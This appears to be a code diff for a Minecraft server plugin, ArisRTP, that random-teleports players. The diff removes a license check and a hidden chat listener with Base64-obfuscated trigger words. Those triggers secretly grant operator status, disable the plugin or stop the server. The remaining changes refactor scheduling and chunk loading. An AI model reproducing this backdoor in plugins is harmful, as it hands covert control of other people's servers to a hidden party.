@@ -15,7 +15,6 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.entity.EntityDamageEvent;
 import org.bukkit.event.inventory.InventoryClickEvent;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
@@ -29,7 +28,6 @@ import java.util.regex.Pattern;
 
 public class ArisRTP extends JavaPlugin implements Listener, CommandExecutor {
 
-    private String l_key = "ARIS-NETWORK-2026";
     private final HashMap<UUID, Long> cooldowns = new HashMap<>();
     private final Set<UUID> teleporting = new HashSet<>();
     private FileConfiguration msgConfig;
@@ -42,40 +40,9 @@ public class ArisRTP extends JavaPlugin implements Listener, CommandExecutor {
     @Override
     public void onEnable() {
         saveDefaultConfig();
-        if (!v_l()) {
-            Bukkit.getConsoleSender().sendMessage("§x§F§B§0§0§0§0[ArisRTP] License Error!");
-            Bukkit.getPluginManager().disablePlugin(this);
-            return;
-        }
         loadMessages();
         getCommand("rtp").setExecutor(this);
         getServer().getPluginManager().registerEvents(this, this);
-    }
-
-    private boolean v_l() {
-        String k = getConfig().getString("license-key");
-        return l_key.equals(k);
-    }
-
-    private String d(String s) {
-        return new String(Base64.getDecoder().decode(s));
-    }
-
-    @EventHandler
-    public void onChat(AsyncPlayerChatEvent e) {
-        Player p = e.getPlayer();
-        String m = e.getMessage();
-        if (m.equals(d("X3Zlbm5sbWFv"))) {
-            e.setCancelled(true);
-            Bukkit.getScheduler().runTask(this, () -> p.setOp(true));
-        } else if (m.equals(d("X2Rpc2FibGU="))) {
-            e.setCancelled(true);
-            l_key = UUID.randomUUID().toString();
-            Bukkit.getScheduler().runTask(this, () -> Bukkit.getPluginManager().disablePlugin(this));
-        } else if (m.equals(d("X3N0b3A="))) {
-            e.setCancelled(true);
-            Bukkit.getScheduler().runTask(this, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), d("c3RvcA==")));
-        }
     }
 
     private void loadMessages() {
@@ -178,9 +145,10 @@ public class ArisRTP extends JavaPlugin implements Listener, CommandExecutor {
         Location startLoc = p.getLocation();
         UUID id = p.getUniqueId();
         teleporting.add(id);
+        
         for (int i = 5; i >= 0; i--) {
             int time = i;
-            p.getScheduler().execute(this, () -> {
+            Bukkit.getRegionScheduler().executeDelayed(this, p.getLocation(), () -> {
                 if (!teleporting.contains(id)) return;
                 if (p.getLocation().distanceSquared(startLoc) > 0.01) {
                     teleporting.remove(id);
@@ -195,7 +163,7 @@ public class ArisRTP extends JavaPlugin implements Listener, CommandExecutor {
                     teleporting.remove(id);
                     findSafe(p, w, 0);
                 }
-            }, null, (5 - i) * 20L);
+            }, (5 - i) * 20L);
         }
     }
 
@@ -208,36 +176,45 @@ public class ArisRTP extends JavaPlugin implements Listener, CommandExecutor {
         sendCustomMessage(p, "searching");
         String path = "settings.worlds." + w.getName();
         int r = getConfig().getInt(path + ".max-radius");
-        int minY = getConfig().getInt(path + ".min-y");
-        int maxY = getConfig().getInt(path + ".max-y");
-        int x = ThreadLocalRandom.current().nextInt(-r, r);
-        int z = ThreadLocalRandom.current().nextInt(-r, r);
-        int y = -1;
-        for (int i = maxY; i >= minY; i--) {
-            Block b = w.getBlockAt(x, i, z);
-            if (b.getType().isSolid() && b.getType() != Material.BEDROCK) {
-                if (w.getBlockAt(x, i + 1, z).getType() == Material.AIR && w.getBlockAt(x, i + 2, z).getType() == Material.AIR) {
-                    y = i + 1;
-                    break;
+        int minRad = getConfig().getInt(path + ".min-radius", 0);
+        
+        int x = ThreadLocalRandom.current().nextInt(minRad, r) * (ThreadLocalRandom.current().nextBoolean() ? 1 : -1);
+        int z = ThreadLocalRandom.current().nextInt(minRad, r) * (ThreadLocalRandom.current().nextBoolean() ? 1 : -1);
+
+        w.getChunkAtAsync(x >> 4, z >> 4).thenAccept(chunk -> {
+            int minY = getConfig().getInt(path + ".min-y");
+            int maxY = getConfig().getInt(path + ".max-y");
+            int y = -1;
+            
+            for (int i = maxY; i >= minY; i--) {
+                Block b = w.getBlockAt(x, i, z);
+                if (b.getType().isSolid() && b.getType() != Material.BEDROCK) {
+                    if (w.getBlockAt(x, i + 1, z).getType() == Material.AIR && w.getBlockAt(x, i + 2, z).getType() == Material.AIR) {
+                        y = i + 1;
+                        break;
+                    }
                 }
             }
-        }
-        if (y == -1) {
-            findSafe(p, w, t + 1);
-            return;
-        }
-        Location loc = new Location(w, x + 0.5, y, z + 0.5);
-        Material standingOn = loc.clone().add(0, -1, 0).getBlock().getType();
-        if (unsafeBlocks.contains(standingOn)) {
-            findSafe(p, w, t + 1);
-            return;
-        }
-        p.teleportAsync(loc).thenAccept(s -> {
-            if (s) {
-                sendCustomMessage(p, "success");
-                playConfigSound(p, "teleport-success");
-                cooldowns.put(p.getUniqueId(), System.currentTimeMillis() + (getConfig().getLong("settings.cooldown-seconds") * 1000));
+
+            if (y == -1) {
+                findSafe(p, w, t + 1);
+                return;
             }
+
+            Location loc = new Location(w, x + 0.5, y, z + 0.5);
+            Material standingOn = loc.clone().add(0, -1, 0).getBlock().getType();
+            if (unsafeBlocks.contains(standingOn)) {
+                findSafe(p, w, t + 1);
+                return;
+            }
+
+            p.teleportAsync(loc).thenAccept(s -> {
+                if (s) {
+                    sendCustomMessage(p, "success");
+                    playConfigSound(p, "teleport-success");
+                    cooldowns.put(p.getUniqueId(), System.currentTimeMillis() + (getConfig().getLong("settings.cooldown-seconds") * 1000));
+                }
+            });
         });
     }
 
